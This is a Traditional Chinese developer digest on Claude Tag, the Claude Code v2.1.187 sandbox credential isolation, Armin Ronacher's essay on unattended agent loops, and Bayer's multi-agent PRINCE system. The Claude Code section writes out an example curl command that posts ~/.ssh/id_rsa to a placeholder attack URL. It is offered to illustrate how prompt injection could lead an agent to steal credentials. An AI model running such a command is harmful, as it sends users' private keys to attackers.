## Claude Tag 把 Claude 放進 Slack 頻道——一個頻道一個 Claude，記憶與權限都 scoped

你的團隊在 Slack 開一個 `#nexus-ui` 頻道，把 Claude Tag 接進去——這個頻道從此擁有「**一個** Claude」，不是每個人各自 spawn 自己的 session。所有成員 `@Claude` 都跟同一份記憶對話：上週 packages/ui 對 OKLCH 三軸 token 的決策、前天設計師對 Button 變體的回饋、昨天 CI 卡住的兩個 PR 都還在 context 裡。管理員預先定義這個 Claude 能存取哪些工具、哪些資料、哪些頻道；同公司另一個 `#mes-dashboard` 開另一個 Claude 實例，**記憶完全隔離**——兩邊不會彼此污染。可以下指令「明天早上 09:00 跑一次 Nexus packages/ui 的 token consistency check 並把結果貼回這個頻道」，Claude 接住、自己排程、自己回報，**autonomous over hours or days**。Anthropic 自家數字：產品團隊 65% 的 code 由他們內部版本的 Claude Tag 生成。2026-06-23 進 beta，給 Claude Enterprise 跟 Team 客戶。

技術上 Claude Tag 把「對話」與「協作」兩件事拆開。傳統 Slack bot 是「我問你答」單回合；Claude Tag 是「貼一個任務，Claude 自己分階段、自己決定要不要用工具、自己等資料、寫完回 thread」。背後三件事在動：第一是 channel-as-context——頻道訊息本身就是 retrieval 來源，不需手動 sync 到 RAG；第二是 multiplayer scoping——多人同時 @Claude 同一個 instance，state 不會打架（context 共用、tool call 序列化）；第三是 admin-defined scope——權限不是 Claude 自己判斷而是管理員預先寫死，每個 instance 拿到的是「白名單後的能力子集」，不需要靠 prompt-level 約束。等於把 6/23 的 deterministic state contract 思路推到「團隊協作層」——access policy 不是 Claude 答完才檢查，而是 instance 初始化當下就鎖死。

以前 Henry 要在團隊裡用 Claude，每個人各自開 terminal `claude` session、自己維護自己的 CLAUDE.md、團隊知識散在每個人 ~/.claude/ 跟個人 Slack DM 裡——上 PR 時兩個工程師對同一個 component 的設計理由可能完全不一樣 Claude 給的答覆。現在 Claude Tag 讓「Nexus team Claude」變成可能：packages/ui 一個 instance、packages/cli 一個、apps/www 一個，**每個 instance 對應一個 channel + 自己的 SKILL.md scope + 隔離記憶**，這正是 6/16 v2.1.178 nested `.claude/skills/` 在「個人機器」做到的事，今天 Claude Tag 推到「組織層」。直接呼應 Henry 客戶採購 deck「Nexus 設計系統不只是元件庫，是團隊知識的固化」這條論述——以前要靠工程師手動同步團隊脈絡，現在 Claude 在每個 channel 自己長記憶。

## Claude Code v2.1.187——sandbox.credentials 把 secrets 跟 sandbox 命令隔開，遠端 MCP 5 分鐘自動 abort

你的 Claude_auto 排程任務每天凌晨跑，會碰到 `~/.aws/credentials`、`~/.ssh/id_rsa`、`GITHUB_TOKEN` 環境變數這些秘密。過去這些檔案跟環境變數對所有 sandboxed 命令一視同仁可讀；今天 v2.1.187（2026-06-23 21:03 UTC release）新增 `sandbox.credentials` 設定——**啟用後 sandboxed Bash 命令完全看不到 credential 檔案跟 secret 環境變數**，連 `cat ~/.aws/credentials` 都會回空。對你來說意義具體：Claude_auto 排程任務跑 `git push origin main` 仍能透過 macOS keychain 走，但任何被 prompt injection 騙去跑的 `curl -X POST 攻擊網址 -d @~/.ssh/id_rsa` 在 sandbox 內讀不到檔。同一版本同時補三個耗時 bug：遠端 MCP tool call 過去會無聲卡到 forever（可以靠 `CLAUDE_CODE_MCP_TOOL_IDLE_TIMEOUT` 環境變數覆寫，**預設 5 分鐘 abort 並回 error**）；`--resume` 過去如果原本 `-p` 跑沒產出任何 model turn 就會 "No conversation found" 失敗，這版修好；`--json-schema` 跟 workflow `agent({schema})` structured output 過去會卡在無限 loop，修好。額外四件 polish：mouse click 支援 fullscreen mode 的 select menu、組織管理員可設模型白名單（model picker / --model / /model / ANTHROPIC_MODEL 都生效，被擋會顯示 "restricted by your organization's settings"）、VSCode extension 載大型 session 不再卡死、貼上韓文/CJK 不再亂碼。

技術上 `sandbox.credentials` 是把過去隱性繼承的「filesystem + env var」trust boundary 第一次顯式拉出來。Sandbox 命令過去從 parent process 繼承所有東西，包括你大部分時候不會主動授權的 credential 檔；現在 settings.json 加 `"sandbox.credentials": "block"`，Claude Code spawn 子 process 時主動 filter 掉這層繼承——這跟 6/15 v2.1.169 `--safe-mode` 同源（給一個保證能跑的乾淨 anchor）只是這次的 anchor 是「拿不到 secret」。`CLAUDE_CODE_MCP_TOOL_IDLE_TIMEOUT` 變數則是把過去隱性的「MCP 卡死直到使用者按 Ctrl-C」翻成「預設 5 分鐘自動 abort + 可調」——延續 6/16 v2.1.178 `Tool(param:value)` 把工具行為從工具名升到工具+參數契約的同一條軸，但這次是把 timeout 這個「藏起來的 cost」first-class 化。

以前 Henry 跑 Claude_auto 排程任務最怕兩件事：一是 prompt injection 把工具用來讀 credential（用 Apple Container 隔離但 ~/.claude/ 是進去後讀得到的），二是某個遠端 MCP server 掛掉導致排程任務無限卡住吃 token。今天 `sandbox.credentials` 把第一件事的攻擊面砍掉一大塊；5 分鐘 MCP timeout 把第二件事的隱性燒錢上限。對 Henry 三條 SKILL.md 升級：（1）frontmatter 加 `requiredMinimumVersion: 2.1.187` + `sandbox.credentials: block` 兩條 settings；（2）`CLAUDE_CODE_MCP_TOOL_IDLE_TIMEOUT=300` 寫進 ~/.claude/settings.json 避免未來接 MCP 卡住跨夜燒錢；（3）跟 6/23 Claude Code v2.1.186 的 `claude mcp login --no-browser` 串起來，SSH 機器上接 MCP server 不需 X11 forwarding 加上預設 5 分鐘 abort，遠端 MCP 第一次有「裝得起來、不會 nuke 你 token」雙保險。

## Armin Ronacher 警告「The Coming Loop」——harness loop 取代 agent loop，30 分鐘無人值守會寫出更糟的 code

你跑 Claude Code session 兩種模式：一種是 agent loop——你下一個指令，Claude 內部呼叫工具、思考、回你，每一輪你在線；另一種是 harness loop——你寫一個外層腳本（cron、CI runner、Claude_auto SKILL.md），它自己決定「下一個 prompt 是什麼」「該不該繼續」「什麼時候叫人」，Claude 變成被外層 schedule 的子單元。Armin Ronacher（Flask / Sentry 作者）在 6/23 的「The Coming Loop」引 Boris Cherny（Claude Code 設計者）原話：**"I don't prompt Claude anymore. I have loops running that prompt Claude."** 這不是技術預測，是 Anthropic 內部已成預設的工作方式。Armin 的數字觀察：Claude Code 跑 **30 分鐘不被打斷的 session 寫出的 code 比去年秋天更差**——因為模型「對 exception 過度恐懼」（Karpathy 原話），會加一層又一層 defensive guard，最後產出一坨沒人讀得懂的 over-engineered code。他另引 Daniel Stenberg 維護 curl 時被 AI-generated 報告淹沒的真實案例：**maintainer 已經被「機器幫機器寫 bug report」這條 loop 壓到喘不過氣**。Armin 的判斷：loop 在 code porting、performance exploration、security scanning 這種「產出短期 artifact」的場景成功，在「要長期維護的系統 code」場景產出失敗。

這篇的核心是把過去糢糊的「AI 幫忙寫 code」拆成兩個有結構性差異的迴圈。Agent loop 的失敗模式是「模型自己出錯」，補救是更好的 prompt；harness loop 的失敗模式是「外層腳本決定錯了 prompt」，補救是改外層腳本的 control flow，跟模型本身關係不大。Armin 沒給具體新工具，但點明未來的工程師工作不是寫 code，是「**有責任地 orchestrate loops**」——決定什麼時候人該介入、什麼時候 loop 該 abort、什麼時候 loop 的產出可以 merge 不需要人讀懂。文章結尾預測「teams may merge code they cannot explain」——這不是反烏托邦，是已經發生的事，只是還沒有共識怎麼處理。

以前 Henry 的 Claude_auto 預設「loop 跑得越久越好」——每天凌晨抓、整理、寫、commit、push，全自動。今天這篇直接戳到痛點：你的 Step 5 自我優化迴圈寫的就是「Claude 自己評自己這 session 寫得好不好」，這正是 Armin 警告的「機器評機器」結構性盲點——同 6/23 LLM-as-judge 0.85 vs trace-based 0.000 是同一條軸，但今天從 evaluation 推到 **orchestration 哲學**。對 Henry 三件 SKILL.md 修正：（1）frontmatter 加 `max-uninterrupted-session-duration: 30m`，每個 stage 超過 30 分鐘自動暫停寫 checkpoint 給人 review；（2）把 Step 5 自我優化迴圈拆成「機器評（trace contract）+ 人評（週末 retro 看 commit 連續品質）」雙軌；（3）對應 Nexus packages/ui 60% AI 生成元件節奏——加 "human review window"，每週留 60 分鐘人讀過去 168 小時 Claude_auto 寫的 commit 是不是還看得懂，看不懂就回到 Step 5 改 SKILL.md。

## Martin Fowler 拆 Bayer PRINCE——5 個專職 agent + 3 種 reflection + LangGraph state 持久化

你不再用一個 agent 解所有問題。Bayer 的 PRINCE 系統（Martin Fowler 2026-06-21 撰文拆解，195 點 HN）把一個「問問題回答案」流程拆成 5 個專職 agent：**Clarify Intent**（先確認使用者問的到底是什麼，模糊就反問）→ **Think & Plan**（決定要走 RAG 還是 Text-to-SQL 還是兩條都走）→ **Researcher**（協調實際的 RAG 與 SQL 工具呼叫）→ **Reflection**（檢查拿到的證據夠不夠回答原問題，不夠就丟回 Researcher 重做）→ **Writer**（寫最終答案 + 加 citation）。具體數字：RAG 先撈 20 個 chunk → rerank 留 top 7；hybrid search 權重 0.7 semantic + 0.3 keyword；Text-to-SQL 限制單次查詢回傳 50 筆內；SQL 生成最多 retry 3 次失敗；query expansion 每個原始問題擴展 5 個語意相似版本一起查。評估走 RAGAS（Faithfulness / Answer Relevancy / Context Relevancy / Answer Accuracy）每日對線上流量打分。架構選型：LangGraph 主編排、FastAPI BFF、Langfuse 觀測、Amazon OpenSearch 向量庫、Amazon Athena 結構化查詢。

這篇的核心洞察不是「多 agent 更好」，是 **context discipline**——每個 stage 拿到的 context 不一樣才是品質關鍵。Think & Plan 拿到 planning context（問題本身 + 可用工具列表），Researcher 拿到 retrieval context（已 rerank 的 chunk），Reflection 拿到 evidence context（前一輪結果 + 原始問題），Writer 拿到 synthesis context（驗證過的證據 + citation）。同一份「資訊」如果 dump 給單一 agent 處理，**context pollution** 會讓 LLM 在無關 token 中迷失；分階段路由 context 是降低 pollution 的工程手段。文章另一個非顯然的點：他們把早期版本的「LLM-as-SQL-reviewer」（讓另一個 LLM 檢查 SQL 是否合法）**整層拿掉**——因為 reviewer 會錯誤 flag 正確 query 浪費 retry 預算，改成 deterministic rule encoding（直接寫死語法檢查）。三種 reflection：process reflection（評估走的流程合不合理）+ data reflection（評估拿到的資料夠不夠）+ draft reflection（評估寫出來的答案有無 hallucination），三件分別由不同 agent 負責，不混在一起。

以前 Henry 想做 MES 戰情室 ECharts 異常曲線 AI 註解或 Nexus apps/demo PDF 上傳 → 結構化提取 → 寫 DB 這類 PoC，**第一直覺是「丟給 Claude 一個 prompt」**——這正是文章警告的 monolithic agent。今天這套 5-agent + 3-reflection + LangGraph state 持久化是直接可移植的 blueprint。對 Henry 三條可同時動：（1）MES 戰情室 ECharts 異常曲線——Clarify Intent agent 確認「使用者問的是哪條曲線哪個時段」 → Think & Plan 決定 RxJS forkJoin 哪兩個 API → Researcher 走 SignalR 拉即時 + Athena 拉歷史 → Reflection 看樣本數夠不夠 → Writer 在 ECharts overlay 寫 annotation 帶 citation；（2）Nexus packages/cli `add` 命令——Clarify Intent 確認使用者要哪種 variant → Think & Plan 規劃要不要拉 Figma → Researcher 拉 token JSON + Storybook source → Reflection 比對是否 OKLCH token 一致 → Writer 生成 Angular component 加 traceable provenance；（3）Claude_auto SKILL.md Step 5 自我優化迴圈——目前是單體「Claude 評 Claude」，按這套拆成 process reflection（評 Step 1-7 流程合不合理）+ data reflection（評抓的條目品質）+ draft reflection（評 AnnotationCard 是否言之有物），三個分開 prompt 不混為一談。

## 今日總結

四篇條目可串成一條軸：**「責任邊界」從個人 session 推到團隊頻道，從一次 prompt 推到 30 分鐘 loop，從一個 agent 推到 5 個專職 agent，從一層 sandbox 推到三層 defense**。Claude Tag 把 Claude 從「個人工具」翻成「頻道一級成員」（admin-defined scope + multiplayer + isolated memory）；Claude Code v2.1.187 把「跑 sandbox 命令」的隱性風險翻成「sandbox.credentials 顯式 block + 5 分鐘 MCP timeout」可量化邊界；Armin Ronacher 把「loop 跑越久越好」預設翻成「30 分鐘 + 沒有人 review 等於慢性 over-engineering」批判；Martin Fowler/Bayer 把「給 Claude 一個大 prompt」直覺翻成「5 agent 分工 + 3 種 reflection + 每階段路由不同 context」具體 blueprint。延續 6/23「verdict 也要 first-class 化」推到下一刻度——**verdict 升格之後，產出 verdict 的「control flow」也要 first-class 化**：Claude Tag 把 channel 當 control flow 邊界、v2.1.187 把 credential filter 跟 MCP timeout 當 control flow 邊界、Armin 把 30 分鐘無人值守當 control flow 邊界、Bayer PRINCE 把 5-agent 階段切換當 control flow 邊界——四件事的共同設計動作是 **explicit control flow over implicit prompt magic**。對 Henry Claude_auto SKILL.md 可同時動三件：（1）frontmatter 補 `requiredMinimumVersion: 2.1.187` + `sandbox.credentials: block` + `CLAUDE_CODE_MCP_TOOL_IDLE_TIMEOUT=300` + `max-uninterrupted-session-duration: 30m`；（2）Step 5 自我優化迴圈拆成 3 個 reflection agent（process / data / draft）取代單一 self-eval；（3）把 Claude_auto 的「scheduled cron」概念對標 Claude Tag 的「channel-scoped Claude」，packages/ui+cli+www 各自一份 SKILL.md 跟 isolated memory，等同預先準備好未來 Slack team Claude 接入時的 multi-tenant 切片。
